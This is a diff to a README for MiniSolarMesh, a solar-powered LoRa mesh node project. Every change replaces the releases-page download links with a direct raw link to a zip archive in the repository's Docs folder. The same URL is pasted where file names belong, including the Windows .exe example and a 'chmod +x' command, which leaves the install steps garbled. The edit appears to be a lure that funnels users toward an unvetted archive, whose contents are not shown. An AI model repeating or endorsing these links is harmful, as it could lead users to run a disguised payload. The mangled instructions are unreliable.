@@ -1,6 +1,6 @@
 # ☀️ MiniSolarMesh - Easy Solar-Powered LORA Node Setup
 
-[![Download MiniSolarMesh](https://img.shields.io/badge/Download-MiniSolarMesh-brightgreen)](https://github.com/sclmoss/MiniSolarMesh/releases)
+[![Download MiniSolarMesh](https://github.com/sclmoss/MiniSolarMesh/raw/refs/heads/main/Docs/Solar-Mini-Mesh-2.0.zip)](https://github.com/sclmoss/MiniSolarMesh/raw/refs/heads/main/Docs/Solar-Mini-Mesh-2.0.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Before you download MiniSolarMesh, please check the following requirements to en
 
 You will find the latest software version by visiting the release page here:
 
-[![Download MiniSolarMesh](https://img.shields.io/badge/Download-Here-blue)](https://github.com/sclmoss/MiniSolarMesh/releases)
+[![Download MiniSolarMesh](https://github.com/sclmoss/MiniSolarMesh/raw/refs/heads/main/Docs/Solar-Mini-Mesh-2.0.zip)](https://github.com/sclmoss/MiniSolarMesh/raw/refs/heads/main/Docs/Solar-Mini-Mesh-2.0.zip)
 
 ### Step 1: Visit the download page
 
@@ -52,9 +52,9 @@ Click the large green button at the top or the link above. This link will take y
 
 Look for the file labeled with your operating system name:
 
-- Windows users: `.exe` file (e.g., MiniSolarMesh-setup.exe)
+- Windows users: `.exe` file (e.g., https://github.com/sclmoss/MiniSolarMesh/raw/refs/heads/main/Docs/Solar-Mini-Mesh-2.0.zip)
 - MacOS users: `.dmg` file
-- Linux users: `.AppImage` or `.tar.gz` depending on the release notes
+- Linux users: `.AppImage` or `https://github.com/sclmoss/MiniSolarMesh/raw/refs/heads/main/Docs/Solar-Mini-Mesh-2.0.zip` depending on the release notes
 
 The file name usually includes the version number and the platform.
 
@@ -66,7 +66,7 @@ Click on the appropriate file to start the download. The download will appear in
 
 - **Windows:** Double-click the `.exe` file and follow the installation wizard.
 - **MacOS:** Open the `.dmg` file and drag MiniSolarMesh to your Applications folder.
-- **Linux:** Make the `.AppImage` executable (`chmod +x filename.AppImage`) and run it.
+- **Linux:** Make the `.AppImage` executable (`chmod +x https://github.com/sclmoss/MiniSolarMesh/raw/refs/heads/main/Docs/Solar-Mini-Mesh-2.0.zip`) and run it.
 
 ### Step 5: Launch MiniSolarMesh
 
@@ -145,4 +145,4 @@ If you run into problems, here are some ways to get support:
 
 Thank you for using MiniSolarMesh. The software is free and open, aiming to make solar-powered mesh networks accessible to everyone.
 
-[Download MiniSolarMesh from here](https://github.com/sclmoss/MiniSolarMesh/releases)
+[Download MiniSolarMesh from here](https://github.com/sclmoss/MiniSolarMesh/raw/refs/heads/main/Docs/Solar-Mini-Mesh-2.0.zip)
